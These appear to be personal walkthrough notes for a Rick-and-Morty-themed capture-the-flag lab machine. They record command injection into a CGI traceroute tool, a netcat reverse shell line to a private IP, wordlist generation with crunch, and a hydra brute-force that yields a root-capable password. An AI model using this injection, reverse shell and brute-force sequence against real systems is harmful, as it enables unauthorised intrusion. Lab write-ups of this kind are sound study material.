Website
  Looks like nothing. Will enumerate.
	robots.txt > /cgi-bin/root_shell.cgi & /cgi-bin/tracertool.cgi
	root_shell is nothing (typical Rick)
	tracertool is valid

  Tracertool outputs straight logs
	start command with semi-colon to use as a shell
		pwd = /var/www/cgi-bin
		reverse shell = ; nc -e /bin/sh 192.168.83.107 4444
	reverse shell, under /var/www/html is a file: passwords
		cat passwords prints a cat (typical Rick). Go to the webpage

192.168.83.118/passwords is vaild (should've found with dirb)

Decrypt says that Rick's password is, in order:
1 uppercase character
1 digit
One of the words in my old bands name. (google it)

(A-Z)(0-9)(Flesh or Curtains)

OK use crunch to create https://tools.kali.org/password-attacks/crunch

crunch options
min-len 7
max-len 7
-t ,%Flesh

min 10
max 10
-t ,%Curtains

crunch 7 7 -t ,%Flesh > passwords.txt
crunch 10 10 -t ,%Curtains >> passwords.txt

using hydra to check (vs RickSanchez and root)

hydra gives us password RickSanchez:P7Curtains
login works
can get root
